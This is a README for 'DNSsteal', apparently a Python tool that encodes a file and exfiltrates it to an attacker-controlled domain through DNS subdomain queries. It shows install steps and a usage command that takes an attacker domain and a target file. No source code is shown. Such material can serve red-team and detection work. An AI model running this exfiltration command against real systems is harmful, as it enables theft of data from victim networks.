![logo](logo.jpg)

**DNSsteal** -- An automatic DNS exfiltration tool

# Purpose
Attacker's frequently use expected protocols to exfiltrate information out of victim environments. DNS can be particularly effective for exfiltration given the protocol's ubiquitous use in practically every environment. 

This tool takes an input file, encodes the data, and exfiltrates the data to an attacker-controlled domain using subdomains.

# Requirements
Run the command:
```python
pip3 install -r requirements.txt
# installs argparse
```
The tool uses `base64`, `subprocess`, `os`, and `datetime` which are already part of the default Python3 installation.

This tool was written in Python3. <br>
This tool was tested on both Windows and Unix.

# Usage
Run the tool:
```python
python3 client.py -d <attacker domain> -f <data file>
```
The tool accepts the following arguments:
```python
-d, --domain       Attacker-controlled domain    # required
-f, --file         Target data file to exfiltrate #required
-s, --server       IP address of DNS server to query #optional
-h, --help         Show help menu

```


# Future Work
* Introduce sequencing mechanism for DNS packets
* Intercept std:out and std:err from subprocess commands